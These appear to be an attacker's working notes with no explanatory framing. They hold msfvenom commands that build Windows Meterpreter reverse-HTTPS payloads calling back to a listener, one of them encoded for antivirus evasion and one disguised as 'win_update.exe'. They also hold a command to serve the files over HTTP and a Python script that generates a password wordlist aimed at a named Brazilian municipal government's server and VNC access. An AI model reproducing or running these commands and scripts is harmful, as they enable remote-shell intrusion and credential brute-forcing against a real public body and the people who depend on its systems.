msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

import itertools

# Criar uma lista de palavras-chave baseadas na Prefeitura de Atibaia e no servidor
keywords = [
    "atibaia", "sumas", "servidor", "prefeitura", "atibaia.gov", "SUMA57667", "admin", "governo", "municipio"
]

# Anos relevantes desde 2019
years = [str(y) for y in range(2019, 2025)]

# Caracteres especiais comuns em senhas
special_chars = ["@", "#", "!", "$", "123", "2024"]

# Gerar combinações de palavras-chave + anos + caracteres especiais
wordlist = set()

for keyword in keywords:
    for year in years:
        wordlist.add(keyword + year)
        for char in special_chars:
            wordlist.add(keyword + year + char)
            wordlist.add(keyword.capitalize() + year + char)
            wordlist.add(keyword.upper() + year + char)

# Adicionar algumas variações extras comuns
common_variations = [
    "Atibaia@123", "Sumas#2024", "Pref@123", "Governo2024!", "Admin2023@", "Servidor#2020"
]
wordlist.update(common_variations)

# Salvar a wordlist em um arquivo
wordlist_path = "/mnt/data/wordlist_atibaia_vnc.txt"
with open(wordlist_path, "w") as f:
    for password in wordlist:
        f.write(password + "\n")

# Exibir o caminho do arquivo gerado
wordlist_path

